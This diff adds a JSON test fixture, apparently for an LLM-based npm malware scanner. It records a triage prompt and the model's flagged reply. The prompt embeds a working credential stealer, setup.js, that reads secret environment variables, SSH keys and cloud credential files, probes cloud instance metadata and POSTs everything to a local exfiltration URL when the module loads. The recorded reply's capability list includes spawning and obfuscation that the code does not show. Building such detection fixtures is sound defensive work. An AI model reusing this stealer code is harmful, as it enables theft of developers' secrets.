@@ -1,0 +1,54 @@
+{
+  "id": "003_flag_24133fb1",
+  "role": "flag",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a high-recall security triage pass over one npm package source file.\n\nFlag anything beyond the stated purpose or intrinsically suspicious: encoded or\nencrypted strings, dynamic code, hidden URLs or shell commands, anti-debugging,\nand time, geography, CI, inspector, or Docker gates. Over-flagging is expected.\nDo not decide malice. Return zero flags only for genuinely boring code."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: Smart configuration loader with environment detection\n- expectedCapabilities: load configuration files, detect environment variables, parse .env files\n- rationale: The package name, description, and keywords indicate it is a configuration loader that works with environment detection and .env files. The description explicitly states 'Smart configuration loader with environment detection' and keywords include 'config', 'env', 'loader', 'dotenv'. As no runtime dependencies or bin entries are declared, the expected capabilities are limited to basic configuration loading and environment variable detection, without any network access or file system operations beyond reading configuration files.\n\n## File: setup.js\n```\n1: const http = require(\"http\");\n2: const https = require(\"https\");\n3: const os = require(\"os\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: \n7: const SAFE_TEST_MODE = true;\n8: const EXFIL_URL = \"http://localhost:9999/exfil\";\n9: const IMDS_URL = \"http://169.254.169.254/latest/meta-data/\";\n10: \n11: const SENSITIVE_KEYS = [\n12:   \"NPM_TOKEN\",\n13:   \"npm_config_registry\",\n14:   \"npm_config__auth\",\n15:   \"AWS_ACCESS_KEY_ID\",\n16:   \"AWS_SECRET_ACCESS_KEY\",\n17:   \"AWS_SESSION_TOKEN\",\n18:   \"GITHUB_TOKEN\",\n19:   \"GH_TOKEN\",\n20:   \"GITLAB_TOKEN\",\n21:   \"AZURE_CLIENT_SECRET\",\n22:   \"DOCKER_AUTH_CONFIG\",\n23:   \"CI\",\n24:   \"JENKINS_URL\",\n25:   \"TRAVIS\",\n26:   \"CIRCLE_TOKEN\",\n27:   \"HOSTNAME\",\n28:   \"USER\",\n29:   \"HOME\",\n30: ];\n31: \n32: function harvestEnv() {\n33:   const harvested = {};\n34:   for (const key of SENSITIVE_KEYS) {\n35:     if (process.env[key]) {\n36:       harvested[key] = process.env[key];\n37:     }\n38:   }\n39: \n40:   for (const [key, value] of Object.entries(process.env)) {\n41:     if (/token|secret|key|password|auth|credential/i.test(key)) {\n42:       harvested[key] = value;\n43:     }\n44:   }\n45:   return harvested;\n46: }\n47: \n48: function readCredentialFiles() {\n49:   const home = os.homedir();\n50:   const targets = [\n51:     path.join(home, \".npmrc\"),\n52:     path.join(home, \".yarnrc\"),\n53:     path.join(home, \".ssh\", \"id_rsa\"),\n54:     path.join(home, \".ssh\", \"id_ed25519\"),\n55:     path.join(home, \".aws\", \"credentials\"),\n56:     path.join(home, \".aws\", \"config\"),\n57:     path.join(home, \".gitconfig\"),\n58:     path.join(home, \".docker\", \"config.json\"),\n59:     path.join(home, \".kube\", \"config\"),\n60:   ];\n61: \n62:   const files = {};\n63:   for (const filePath of targets) {\n64:     try {\n65:       const content = fs.readFileSync(filePath, \"utf-8\");\n66:       files[filePath] = content;\n67:     } catch (e) {\n68: \n69:     }\n70:   }\n71:   return files;\n72: }\n73: \n74: function probeIMDS(callback) {\n75:   http\n76:     .get(IMDS_URL, { timeout: 2000 }, (res) => {\n77:       let data = \"\";\n78:       res.on(\"data\", (chunk) => (data += chunk));\n79:       res.on(\"end\", () => callback(data));\n80:     })\n81:     .on(\"error\", () => callback(null));\n82: }\n83: \n84: function exfiltrate(payload) {\n85:   const data = JSON.stringify(payload);\n86:   const url = new URL(EXFIL_URL);\n87: \n88:   const options = {\n89:     hostname: url.hostname,\n90:     port: url.port,\n91:     path: url.pathname,\n92:     method: \"POST\",\n93:     headers: {\n94:       \"Content-Type\": \"application/json\",\n95:       \"Content-Length\": Buffer.byteLength(data),\n96:       \"User-Agent\": \"npm/8.0.0 node/v18.0.0\",\n97:     },\n98:   };\n99: \n100:   const req = http.request(options, () => {});\n101:   req.on(\"error\", () => {\n102: \n103:   });\n104:   req.write(data);\n105:   req.end();\n106: }\n107: \n108: const stolen = {\n109:   timestamp: new Date().toISOString(),\n110:   hostname: os.hostname(),\n111:   username: os.userInfo().username,\n112:   platform: process.platform,\n113:   arch: os.arch(),\n114:   cwd: process.cwd(),\n115:   env: harvestEnv(),\n116:   files: readCredentialFiles(),\n117:   imds: null,\n118: };\n119: \n120: probeIMDS((imdsData) => {\n121:   stolen.imds = imdsData;\n122:   exfiltrate(stolen);\n123: });\n```\n\n## Task\nReturn a compact summary, only security capabilities from the supplied enum, and at most 8 highest-signal thin flags with compact exact ranges such as 12-18. Do not flag ordinary logging, feature detection, regular expressions, encoding, or environment access when it is intrinsic to the stated purpose and does not handle secrets or evade analysis."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-24133fb1",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "Parasail",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"summary\": \"The file setup.js contains extensive exfiltration logic that is completely outside its stated purpose of being a smart configuration loader. It harvests environment secrets, reads private credential files, probes cloud metadata services (IMDS), and sends all collected data to an external endpoint. Even though the exfiltration URL points to localhost and a SAFE_TEST_MODE flag is set, the code structure is that of a credential-stealing implant and includes malicious surveillance patterns fully unrelated to configuration loading.\",\n  \"capabilities\": [\n    \"DATA_EXFILTRATION\",\n    \"ENV_VARS\",\n    \"FILESYSTEM\",\n    \"NETWORK\",\n    \"OBFUSCATION\",\n    \"PROCESS_SPAWN\",\n    \"FILESYSTEM\",\n    \"NETWORK\"\n  ],\n  \"flags\": [\n    {\n      \"lines\":  [  \"8\",   \"9\"],\n      \"why\": \"Hardcoded exfiltration URL and IMDS probe URL — clearly malicious for remote data theft.\"\n    },\n    {\n      \"lines\":  [  \"11\",   \"30\"],\n      \"why\": \"Targeted list of secret environment variables (tokens, cloud keys, CI tokens) for harvesting.\"\n    },\n    {\n      \"lines\":  [  \"32\",   \"46\"],\n      \"why\": \"harvestEnv() scans and copies all env vars matching token/secret patterns — credential theft.\"\n    },\n    {\n      \"lines\":  [  \"48\",   \"72\"],\n      \"why\": \"readCredentialFiles() reads sensitive private key files, cloud configs, Docker, and Kubernetes credentials.\"\n    },\n    {\n      \"lines\":  [  \"74\",   \"82\"],\n      \"why\": \"probeIMDS() queries cloud metadata service (169.254.169.254) to steal instance identity and credentials.\"\n    },\n    {\n      \"lines\":  [  \"84\", \"106\"],\n      \"why\": \"exfiltrate() sends collected secrets over HTTP POST to the exfiltration server — actual data theft.\"\n    },\n    {\n      \"lines\":  [  \"108\", \"118\"],\n      \"why\": \"Immediately collects hostname, username, env secrets, files, and IMDS placeholder on module load.\"\n    },\n    {\n      \"lines\":  [  \"120\", \"123\"],\n      \"why\": \"Probes IMDS asynchronously and exfiltrates all stolen data — auto-execution on require/import.\"\n    }\n  ]\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 1380,
+        "completion_tokens": 530,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "ebbf58e539f8",
+    "transport": "strict_schema",
+    "recordedStatus": "ok",
+    "recordedTs": "2026-07-23T10:07:05.088Z",
+    "recordedLatencyMs": 11046
+  }
+}
